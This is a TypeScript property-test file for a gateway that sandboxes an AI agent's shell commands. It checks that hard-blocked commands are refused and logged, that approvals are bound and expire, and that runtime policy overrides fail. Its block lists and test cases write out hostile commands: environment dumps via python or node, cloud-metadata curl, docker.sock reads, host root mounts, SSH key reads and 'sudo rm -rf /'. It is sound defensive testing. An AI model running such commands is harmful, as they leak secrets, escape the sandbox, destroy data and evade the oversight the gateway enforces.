// Task 10.9: Property test for Hard-blocked commands never run (P19)
// Validates: Requirements 20.4, 20.6, 20.7, 20.8, 20.10, 29.10, 29.11, 29.12

import test from "node:test";
import * as assert from "node:assert/strict";
import * as path from "node:path";
import * as fc from "fast-check";
import {
  McpGateway,
  classifyCommand,
  checkHardBlocks,
  ApprovalManager,
  sha256Argv,
  handleSandboxExec,
  getCommittedPolicy,
  formatPolicyForAdmin,
} from "../../lib/gateway";
import type {
  ToolExecutionContext,
  SandboxExecParams,
  SandboxExecBlockedResult,
  SandboxExecApprovalPendingResult,
  SandboxExecCompletedResult,
} from "../../lib/gateway";
import { EventStore } from "../../lib/events/event-store";
import { LogStore } from "../../lib/events/log-store";
import { RunStore } from "../../lib/runs/run-store";
import { redactText } from "../../lib/security/redactor";
import type { Sandbox, ExecutionBackend, ExecRequest, ExecResult } from "../../lib/backend/types";

/**
 * Hard-block token generators representing all categories under Requirements 20.4, 29.10, 29.11, 29.12.
 */
const HARD_BLOCK_TOKENS = [
  // Sudo privilege escalation (Requirement 29.12)
  "sudo",
  "doas",
  "su",
  "/usr/bin/sudo",
  // Kiro API key (Requirement 29.11)
  "KIRO_API_KEY",
  "kiro_api_key",
  "kiro-api-key",
  "kiro_key",
  "ksk_canary_0123456789",
  "KIRO_TOKEN",
  // GitHub token (Requirement 29.11)
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "ghp_012345678901234567890123456789",
  "github_pat_11AAAAAAA0123456789_abcdef",
  "gho_abcdef1234567890",
  // Environment dump tokens (Requirement 29.11)
  "printenv",
  "/proc/self/environ",
  "/proc/1/environ",
  "/proc/42/environ",
  // ~/.ssh credentials (Requirement 29.11)
  "~/.ssh",
  "~/.ssh/id_rsa",
  "~/.ssh/id_ed25519",
  "authorized_keys",
  "known_hosts",
  // Cloud metadata IP / DNS (Requirement 29.11)
  "169.254.169.254",
  "metadata.google.internal",
  "metadata.google",
  "fd00:ec2::254",
  // Container sockets (Requirement 29.12)
  "docker.sock",
  "containerd.sock",
  "podman.sock",
  "/var/run/docker.sock",
  "/run/containerd/containerd.sock",
  // Host mounts and escape directories (Requirement 29.12)
  "/host",
  "/host/etc",
  "/proc",
  "/proc/cpuinfo",
  "/sys",
  "/sys/class",
  "/dev",
  "/dev/sda",
  "-v/",
  "-v /",
  "-v /:",
  "--mount",
  "--volume",
] as const;

/**
 * Standalone environment dump commands that are strictly blocked (Requirement 29.11).
 */
const STANDALONE_ENV_DUMP_COMMANDS: string[][] = [
  ["env"],
  ["env", "-i"],
  ["env", "-0"],
  ["/usr/bin/env"],
  ["printenv"],
  ["printenv", "PATH"],
  ["export"],
  ["set"],
  ["cat", "/proc/self/environ"],
  ["cat", "/proc/1/environ"],
];

/**
 * Helper to construct a MockSandbox that records whether any execution occurred.
 */
function createMockSandbox(boxName: "runbox" | "auditbox"): {
  sandbox: Sandbox;
  getExecCount: () => number;
  getExecutedArgvs: () => string[][];
} {
  let execCount = 0;
  const executedArgvs: string[][] = [];

  const sandbox: Sandbox = {
    id: `box-${boxName}-mock`,
    run: async (req: ExecRequest): Promise<ExecResult> => {
      execCount++;
      executedArgvs.push(req.argv);
      return {
        logRef: `log-${boxName}-${execCount}`,
        oomKilled: false,
        exitCode: 0,
        stdoutTail: `Executed in ${boxName}: ${req.argv.join(" ")}`,
        stderrTail: "",
        truncated: false,
        timedOut: false,
      };
    },
    exec: async (req: ExecRequest) => {
      execCount++;
      executedArgvs.push(req.argv);
      return {
        output: (async function* () {
          yield { seq: 1, stream: "stdout" as const, data: `Executed in ${boxName}` };
        })(),
        wait: async () => ({ exitCode: 0, timedOut: false }),
        kill: async () => {},
      };
    },
    wait: async () => ({ exitCode: 0, timedOut: false, oomKilled: false }),
    stop: async () => {},
    destroy: async () => {},
  };

  return {
    sandbox,
    getExecCount: () => execCount,
    getExecutedArgvs: () => executedArgvs,
  };
}

/**
 * Helper to construct a MockBackend.
 */
function createMockBackend(runboxMock: Sandbox, auditboxMock: Sandbox): ExecutionBackend {
  return {
    kind: "instabox-docker",
    create: async () => runboxMock,
    get: async (id: string) => (id.includes("audit") ? auditboxMock : runboxMock),
    destroy: async () => {},
  };
}

test("Property 19.1: Hard-blocked commands never start a process in any box and command.refused is stored in EventStore", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  let customRunnerCalls = 0;
  const customRunner = async () => {
    customRunnerCalls++;
    return { exitCode: 0, stdout: "", stderr: "" };
  };

  const emittedEvents: Array<{ kind: string; runId: string; data: Record<string, unknown> }> = [];

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
    onEmitEvent: (evt) => {
      emittedEvents.push(evt);
    },
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-prop19",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-prop19-blocked",
  });

  const warden = gw.registerSkeleton({
    skeletonId: "skel-warden-prop19",
    role: "Warden",
    worktreeRoot: "/workspace/repo",
    runId: "run-prop19-blocked",
  });

  // Fast-check property test across hard-block tokens
  await fc.assert(
    fc.asyncProperty(
      fc.constantFrom(...HARD_BLOCK_TOKENS),
      fc.array(fc.string({ minLength: 1, maxLength: 15 }), { minLength: 0, maxLength: 3 }),
      fc.constantFrom("Soul-stitcher", "Warden"),
      async (hardToken, extraArgs, role) => {
        const token = role === "Warden" ? warden.bearerToken : soul.bearerToken;
        const initialExecCount = runboxMock.getExecCount() + auditboxMock.getExecCount() + customRunnerCalls;

        // Construct argv with hard-block token
        const argv = [hardToken, ...extraArgs];

        const result = (await gw.handleToolCall(token, "sandbox_exec", {
          argv,
          cwd: "/workspace/repo",
        })) as SandboxExecBlockedResult;

        // 1. Must return status: "blocked"
        assert.equal(
          result.status,
          "blocked",
          `Expected status blocked for argv: ${argv.join(" ")}`
        );
        assert.ok(result.reason, "Blocked result must provide a reason");

        // 2. No process starts in any box
        const postExecCount = runboxMock.getExecCount() + auditboxMock.getExecCount() + customRunnerCalls;
        assert.equal(
          postExecCount,
          initialExecCount,
          `Process was started for hard-blocked argv: ${argv.join(" ")}`
        );

        // 3. command.refused is stored in EventStore
        const storedEvents = eventStore.getEvents("run-prop19-blocked", { kind: "command.refused" });
        assert.ok(
          storedEvents.length > 0,
          `command.refused event was not stored in EventStore for: ${argv.join(" ")}`
        );
        const lastRefused = storedEvents[storedEvents.length - 1];
        assert.equal(lastRefused.kind, "command.refused");
        // SB4a (Audit N-B3): argv is redacted before the event reaches EventStore
        assert.deepEqual(
          (lastRefused.data as Record<string, unknown>).argv,
          argv.map((arg) => redactText(arg))
        );
      }
    ),
    { numRuns: 100 }
  );

  // Standalone environment dump commands must all classify as blocked and store command.refused
  for (const argv of STANDALONE_ENV_DUMP_COMMANDS) {
    const beforeCount = runboxMock.getExecCount() + auditboxMock.getExecCount() + customRunnerCalls;
    const res = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
      argv,
      cwd: "/workspace/repo",
    })) as SandboxExecBlockedResult;

    assert.equal(res.status, "blocked", `Expected env dump to be blocked: ${argv.join(" ")}`);
    const afterCount = runboxMock.getExecCount() + auditboxMock.getExecCount() + customRunnerCalls;
    assert.equal(afterCount, beforeCount, `Process should not start for env dump: ${argv.join(" ")}`);
  }
});

test("Property 19.2: Hard blocks cannot be overridden by approval grants, pattern approvals, or permissive options (Requirement 29.10)", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-override",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-override-test",
  });

  // Attempt 1: Pre-grant one-time approval for hard-blocked command
  const hardBlockedCmds = [
    ["sudo", "rm", "-rf", "/"],
    ["cat", "/proc/self/environ"],
    ["curl", "http://169.254.169.254/latest/meta-data"],
    ["cat", "/var/run/docker.sock"],
    ["git", "commit", "-m", "leaked KIRO_API_KEY"],
    ["echo", "ghp_123456789012345678901234567890"],
    ["ls", "/host"],
  ];

  for (const argv of hardBlockedCmds) {
    // Attempt to grant approval
    gw.approvalManager.grantOnce(soul.skeletonId, argv, "/workspace/repo", 60000);
    // Attempt to add pattern approval
    gw.approvalManager.addPatternApproval("run-override-test", argv.join(" "));

    const beforeCount = runboxMock.getExecCount();

    const res = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
      argv,
      cwd: "/workspace/repo",
    })) as SandboxExecBlockedResult;

    // Hard block remains in effect
    assert.equal(res.status, "blocked", `Hard block overridden for: ${argv.join(" ")}`);
    assert.equal(
      runboxMock.getExecCount(),
      beforeCount,
      `Process started despite hard block for: ${argv.join(" ")}`
    );

    // command.refused stored in EventStore
    const refusedEvents = eventStore.getEvents("run-override-test", { kind: "command.refused" });
    assert.ok(refusedEvents.length > 0);
  }
});

test("Property 19.3: Needs_approval commands run ONLY after matching approval grants (Requirements 20.6, 20.7, 20.8)", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-needs-appr",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-needs-appr",
  });

  const otherSkeleton = gw.registerSkeleton({
    skeletonId: "skel-other",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-needs-appr",
  });

  await fc.assert(
    fc.asyncProperty(
      fc.array(fc.string({ minLength: 1, maxLength: 10 }), { minLength: 1, maxLength: 3 })
        .filter((commandSuffix) => classifyCommand(["custom-tool", ...commandSuffix]).classification === "needs_approval"),
      async (commandSuffix) => {
        // Needs-approval command (e.g., custom binary)
        const argv = ["custom-tool", ...commandSuffix];
        const cwd = "/workspace/repo";

        // Step 1: Call without approval grant -> must return approval_pending, no process started
        const initialCount = runboxMock.getExecCount();
        const pendingRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
          argv,
          cwd,
        })) as SandboxExecApprovalPendingResult;

        assert.equal(pendingRes.status, "approval_pending");
        assert.ok(pendingRes.approvalId.startsWith("appr-"));
        assert.ok(pendingRes.expiresAt > Date.now());
        assert.equal(runboxMock.getExecCount(), initialCount, "No process should start without approval grant");

        // EventStore should have approval.requested
        const reqEvents = eventStore.getEvents("run-needs-appr", { kind: "approval.requested" });
        assert.ok(reqEvents.length > 0);

        // Step 2: Grant one-time approval bound to (skeletonId, sha256(argv), cwd)
        gw.approvalManager.grantOnce(soul.skeletonId, argv, cwd, 10000);

        // Step 3: Call with matching grant -> executes exactly once
        const executedRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
          argv,
          cwd,
        })) as SandboxExecCompletedResult;

        assert.equal(executedRes.status, "completed");
        assert.equal(executedRes.exit_code, 0);
        assert.equal(runboxMock.getExecCount(), initialCount + 1, "Process should start exactly once after grant");

        // Step 4: Second call with the same command -> must NOT run (grant consumed, valid for at most one execution)
        const secondRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
          argv,
          cwd,
        })) as SandboxExecApprovalPendingResult;

        assert.equal(
          secondRes.status,
          "approval_pending",
          "One-time grant must not be reused for a second execution"
        );
        assert.equal(runboxMock.getExecCount(), initialCount + 1, "No second process should start");
      }
    ),
    { numRuns: 30 }
  );

  // Explicit verification: ['custom-tool', 'SU', ' '] is classified as blocked/refused rather than approval_pending
  const blockedArgv = ["custom-tool", "SU", " "];
  const blockedClassification = classifyCommand(blockedArgv);
  assert.equal(blockedClassification.classification, "blocked");
  assert.notEqual(blockedClassification.classification, "needs_approval");

  const blockedInitialCount = runboxMock.getExecCount();
  const blockedRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv: blockedArgv,
    cwd: "/workspace/repo",
  })) as SandboxExecBlockedResult;

  assert.equal(blockedRes.status, "blocked");
  assert.notEqual((blockedRes as any).status, "approval_pending");
  assert.ok(blockedRes.reason);
  assert.equal(runboxMock.getExecCount(), blockedInitialCount, "No process should start for blocked command");

  const refusedEvents = eventStore.getEvents("run-needs-appr", { kind: "command.refused" });
  assert.ok(refusedEvents.length > 0);
});

test("Property 19.3 focused subtest: ['custom-tool', 'SU', ' '] is classified as blocked/refused rather than approval_pending", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-blocked-subtest",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-blocked-subtest",
  });

  const argv = ["custom-tool", "SU", " "];
  const cwd = "/workspace/repo";

  // classifyCommand directly verifies blocked rather than needs_approval
  const classification = classifyCommand(argv);
  assert.equal(classification.classification, "blocked");
  assert.notEqual(classification.classification, "needs_approval");

  // Gateway handleToolCall verifies blocked/refused rather than approval_pending
  const initialCount = runboxMock.getExecCount();
  const res = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv,
    cwd,
  })) as SandboxExecBlockedResult;

  assert.equal(res.status, "blocked");
  assert.notEqual((res as any).status, "approval_pending");
  assert.ok(res.reason);
  assert.equal(runboxMock.getExecCount(), initialCount, "No process should start for blocked command");

  // Verify command.refused was recorded in EventStore
  const refusedEvents = eventStore.getEvents("run-blocked-subtest", { kind: "command.refused" });
  assert.ok(refusedEvents.length > 0, "command.refused event must be recorded in EventStore");
});

test("Property 19.4: Approval grants fail if skeletonId, argv, or cwd mismatch (Requirement 20.7)", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-bind",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-bind-test",
  });

  const other = gw.registerSkeleton({
    skeletonId: "skel-other-bind",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-bind-test",
  });

  const argv = ["cargo", "build", "--release"];
  const cwd = "/workspace/repo";

  // Grant approval bound to soul.skeletonId, sha256(argv), cwd
  gw.approvalManager.grantOnce(soul.skeletonId, argv, cwd, 10000);

  // 1. Mismatched skeletonId: other skeleton attempts execution
  const otherRes = (await gw.handleToolCall(other.bearerToken, "sandbox_exec", {
    argv,
    cwd,
  })) as SandboxExecApprovalPendingResult;
  assert.equal(otherRes.status, "approval_pending", "Other skeleton must not consume soul's grant");
  assert.equal(runboxMock.getExecCount(), 0);

  // 2. Mismatched cwd: soul attempts execution in different cwd
  const diffCwdRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv,
    cwd: "/workspace/repo/subdir",
  })) as SandboxExecApprovalPendingResult;
  assert.equal(diffCwdRes.status, "approval_pending", "Different cwd must not consume grant");
  assert.equal(runboxMock.getExecCount(), 0);

  // 3. Mismatched argv: soul attempts execution with different flag
  const diffArgvRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv: ["cargo", "build", "--debug"],
    cwd,
  })) as SandboxExecApprovalPendingResult;
  assert.equal(diffArgvRes.status, "approval_pending", "Different argv must not consume grant");
  assert.equal(runboxMock.getExecCount(), 0);

  // 4. Exact match succeeds and consumes the grant
  const matchRes = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv,
    cwd,
  })) as SandboxExecCompletedResult;
  assert.equal(matchRes.status, "completed");
  assert.equal(runboxMock.getExecCount(), 1);
});

test("Property 19.5: Expired approval grants are treated as void and never start a process (Requirement 20.8)", async () => {
  const eventStore = new EventStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const soul = gw.registerSkeleton({
    skeletonId: "skel-soul-expire",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-expire-test",
  });

  const argv = ["mvn", "clean", "package"];
  const cwd = "/workspace/repo";

  // Grant with negative TTL (already expired)
  gw.approvalManager.grantOnce(soul.skeletonId, argv, cwd, -100);

  const res = (await gw.handleToolCall(soul.bearerToken, "sandbox_exec", {
    argv,
    cwd,
  })) as SandboxExecApprovalPendingResult;

  // Must not run; treated as void
  assert.equal(res.status, "approval_pending");
  assert.equal(runboxMock.getExecCount(), 0, "Expired grant must not start any process");
});

test("Property 19.6: Run-scoped pattern approvals allow execution only within that run (Requirement 20.9)", async () => {
  const eventStore = new EventStore(":memory:");
  const runStore = new RunStore(":memory:");
  const runboxMock = createMockSandbox("runbox");
  const auditboxMock = createMockSandbox("auditbox");
  const backend = createMockBackend(runboxMock.sandbox, auditboxMock.sandbox);

  runStore.createRun({
    runId: "run-pattern-1",
    url: "https://github.com/test-owner/test-repo",
    sha: "0123456789abcdef",
  });
  runStore.createRun({
    runId: "run-pattern-2",
    url: "https://github.com/test-owner/test-repo",
    sha: "0123456789abcdef",
  });

  const gw = new McpGateway({
    defaultTimeoutMs: 60000,
    approvalWaitMs: 300000,
    logStore: new LogStore({ inMemory: true }),
    eventStore,
    runStore,
    backend,
    runbox: runboxMock.sandbox,
    auditbox: auditboxMock.sandbox,
  });

  const skelRun1 = gw.registerSkeleton({
    skeletonId: "skel-run1",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-pattern-1",
  });

  const skelRun2 = gw.registerSkeleton({
    skeletonId: "skel-run2",
    role: "Soul-stitcher",
    worktreeRoot: "/workspace/repo",
    runId: "run-pattern-2",
  });

  // Approve pattern for run-pattern-1 only
  gw.approvalManager.addPatternApproval("run-pattern-1", "make test-*");

  // Call from run 1 with matching pattern -> executes
  const run1Res = (await gw.handleToolCall(skelRun1.bearerToken, "sandbox_exec", {
    argv: ["make", "test-unit"],
    cwd: "/workspace/repo",
  })) as SandboxExecCompletedResult;
  assert.equal(run1Res.status, "completed");
  assert.equal(runboxMock.getExecCount(), 1);

  // Call from run 2 with the same pattern -> pending (not approved for run 2)
  const run2Res = (await gw.handleToolCall(skelRun2.bearerToken, "sandbox_exec", {
    argv: ["make", "test-unit"],
    cwd: "/workspace/repo",
  })) as SandboxExecApprovalPendingResult;
  assert.equal(run2Res.status, "approval_pending");
  assert.equal(runboxMock.getExecCount(), 1, "Run 2 must not inherit run 1 pattern approval");
});

test("Property 19.7: Refusal of blocked commands emits command.refused and stores in EventStore (Requirements 20.10, 29.10)", async () => {
  const eventStore = new EventStore(":memory:");
  const emittedEvents: Array<{ kind: string; runId: string; data: Record<string, unknown> }> = [];

  const context: ToolExecutionContext = {
    skeletonId: "skel-direct-refuse",
    role: "Exhumer",
    bearerToken: "token-refuse",
    worktreeRoot: "/workspace/repo",
    runId: "run-direct-refuse",
  };

  const blockedParamsList: SandboxExecParams[] = [
    { argv: ["sudo", "apt", "install", "gcc"] },
    { argv: ["cat", "/proc/self/environ"] },
    { argv: ["curl", "http://169.254.169.254/latest/meta-data/"] },
    { argv: ["docker", "run", "-v", "/:/host", "alpine"] },
    { argv: ["cat", "~/.ssh/authorized_keys"] },
    { argv: ["echo", "KIRO_API_KEY=test-key"] },
    { argv: ["echo", "GITHUB_TOKEN=ghp_secret"] },
    { argv: ["cat", "/var/run/docker.sock"] },
  ];

  for (const params of blockedParamsList) {
    const res = await handleSandboxExec(params, context, {
      eventStore,
      onEmitEvent: (evt) => {
        emittedEvents.push(evt);
      },
    });

    assert.equal(res.status, "blocked");
    assert.ok((res as SandboxExecBlockedResult).reason.length > 0);
  }

  // Verify all command.refused events in EventStore
  const refusedInStore = eventStore.getEvents("run-direct-refuse", { kind: "command.refused" });
  assert.equal(refusedInStore.length, blockedParamsList.length);

  for (let i = 0; i < blockedParamsList.length; i++) {
    const stored = refusedInStore[i];
    assert.equal(stored.kind, "command.refused");
    assert.equal(stored.actor, "exhumer");
    // SB4a (Audit N-B3): argv is redacted before the event reaches EventStore
    assert.deepEqual(
      (stored.data as Record<string, unknown>).argv,
      blockedParamsList[i].argv.map((arg) => redactText(arg))
    );
    assert.ok((stored.data as Record<string, unknown>).reason);
  }

  // Verify emitted events match
  assert.equal(emittedEvents.filter((e) => e.kind === "command.refused").length, blockedParamsList.length);
});

test("hard blocks: unwrap env, sh -c, bash -c, and code-running interpreters for environment dumps (WP F05)", () => {
  // 1. env wrapper forms that dump environment
  const envDumpArgvs: Array<{ argv: string[]; label: string }> = [
    { argv: ["env", "printenv"], label: "env wrapping printenv" },
    { argv: ["env", "-i", "printenv"], label: "env -i wrapping printenv" },
    { argv: ["env", "FOO=bar", "env"], label: "env with assignment wrapping env" },
    { argv: ["sh", "-c", "env"], label: "sh -c wrapping env" },
    { argv: ["sh", "-c", "printenv"], label: "sh -c wrapping printenv" },
    { argv: ["bash", "-c", "export"], label: "bash -c wrapping export" },
    { argv: ["bash", "-c", "echo test && env"], label: "bash -c with pipeline containing env" },
    { argv: ["node", "-e", "console.log(process.env)"], label: "node -e process.env" },
    { argv: ["node", "--eval", "console.log(process['env'])"], label: "node --eval process['env']" },
    { argv: ["python", "-c", "import os; print(os.environ)"], label: "python -c os.environ" },
    { argv: ["python3", "-c", "import os; print(os.getenv('TOKEN'))"], label: "python3 -c os.getenv" },
    { argv: ["python", "-c", "import os; print(os.environb)"], label: "python -c os.environb" },
    { argv: ["sh", "-c", "node -e 'console.log(process.env)'"], label: "nested sh -> node -e env dump" },
    { argv: ["env", "sh", "-c", "python3 -c 'import os; print(os.environ)'"], label: "nested env -> sh -> python env dump" },
  ];

  for (const item of envDumpArgvs) {
    const res = classifyCommand(item.argv);
    assert.equal(
      res.classification,
      "blocked",
      `Expected blocked for env dump (${item.label}): got ${res.classification} for ${JSON.stringify(item.argv)}`
    );
    assert.equal(res.matchedRule, "hard-block-env-dump");
  }

  // 2. Non-dump commands wrapped in env or interpreters are NOT blocked as env dump
  const safeArgvs = [
    ["node", "-e", "console.log(1 + 1)"],
    ["python", "-c", "print(1 + 1)"],
    ["python3", "-c", "import sys; print(sys.version)"],
    ["env", "NODE_ENV=production", "npm", "test"],
    ["sh", "-c", "git status"],
  ];

  for (const argv of safeArgvs) {
    const res = classifyCommand(argv, { worktreeRoot: "/workspace/repo", cwd: "/workspace/repo" });
    assert.notEqual(
      res.matchedRule,
      "hard-block-env-dump",
      `Safe command ${JSON.stringify(argv)} should not match hard-block-env-dump`
    );
  }
});

test("policy source: allowed command rules come only from committed policy, runtime overrides removed, policy deep-frozen (WP F05)", () => {
  const policy = getCommittedPolicy();
  assert.ok(Object.isFrozen(policy), "getCommittedPolicy() must be frozen");
  assert.ok(Object.isFrozen(policy.allowedCommands), "allowedCommands must be frozen");
  assert.ok(Object.isFrozen(policy.hardBlockRules), "hardBlockRules must be frozen");
  assert.ok(Object.isFrozen(policy.egressAllowlist), "egressAllowlist must be frozen");

  // formatPolicyForAdmin() is deep-frozen
  const adminView = formatPolicyForAdmin();
  assert.ok(Object.isFrozen(adminView), "adminView must be frozen");
  assert.ok(Object.isFrozen(adminView.policy), "adminView.policy must be frozen");
  assert.ok(Object.isFrozen(adminView.policy.allowedCommands), "adminView.policy.allowedCommands must be frozen");

  // Attempted runtime overrides of policy or egressAllowlist in classifyCommand are ignored
  const maliciousPolicy: any = {
    version: "9.9.9",
    name: "malicious-policy",
    description: "malicious",
    egressAllowlist: ["*"],
    allowedCommands: [{ id: "allow-all", name: "allow-all", argvPrefix: ["curl"] }],
    hardBlockRules: [],
    defaultClassification: "allowed",
  };

  // curl is not in committed allowed rules -> with runtime override removed, it requires approval
  const resWithPolicyOverride = classifyCommand(["curl", "https://example.com"], {
    policy: maliciousPolicy,
    worktreeRoot: "/workspace/repo",
    cwd: "/workspace/repo",
  });
  assert.notEqual(resWithPolicyOverride.classification, "allowed", "options.policy must not override committed rules");
  assert.equal(resWithPolicyOverride.classification, "needs_approval");

  // egressAllowlist override attempt: example.com is not in committed egress allowlist
  const resWithEgressOverride = classifyCommand(["npm", "install", "https://malicious-domain.com/pkg.tgz"], {
    egressAllowlist: ["malicious-domain.com"],
    worktreeRoot: "/workspace/repo",
    cwd: "/workspace/repo",
  });
  assert.equal(resWithEgressOverride.classification, "needs_approval");
  assert.ok(resWithEgressOverride.reason?.includes("outside egress allowlist"));
});
